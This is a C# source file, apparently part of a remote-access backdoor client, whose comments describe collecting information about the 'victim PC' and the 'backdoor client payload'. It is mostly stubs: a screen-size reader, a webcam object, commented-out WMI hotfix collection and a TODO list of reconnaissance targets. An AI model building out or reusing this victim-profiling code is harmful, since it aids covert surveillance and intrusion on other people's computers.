﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class FuncInfo
    {
        /// <summary>
        /// Information of victim PC
        /// </summary>
        internal class PC
        {
            private Webcam webcam;

            public Size MainScreenSize()
            {
                Rectangle rect = Screen.AllScreens[0].Bounds;
                return new Size(rect.Width, rect.Height);
            }

            public void GetSysInfo()
            {
                /*
                 * [ TODO LIST ]:
                 * BIOS
                 * BATTERY
                 * ACCOUNT - LEAVE IT FOR DOMAIN?
                 * GROUP - LEAVE IT FOR DOMAIN?
                 * ENVIRONMENT VARIABLES
                 * COM
                 * USB HUB
                 */
            }

            public ClientConfig Info()
            {
                //USING THE PREFIX "d" TO REPRESENTS "DATA"
                Size size_screen = MainScreenSize();
                if (webcam == null)
                    webcam = new Webcam();

                /*
                string data = string.Join("|", new string[]
                {
                    d_basic, //BASIC INFORMATION
                    WMI_Query("SELECT * FROM Win32_QuickFixEngineering"), //HOTFIXES
                }.Select(x => Crypto.b64E2Str(x)));
                */

                return new ClientConfig();
            }
        }

        /// <summary>
        /// Information of the backdoor client payload on victim PC
        /// </summary>
        public class Client
        {
            public void Info()
            {

            }
        }
    }
}
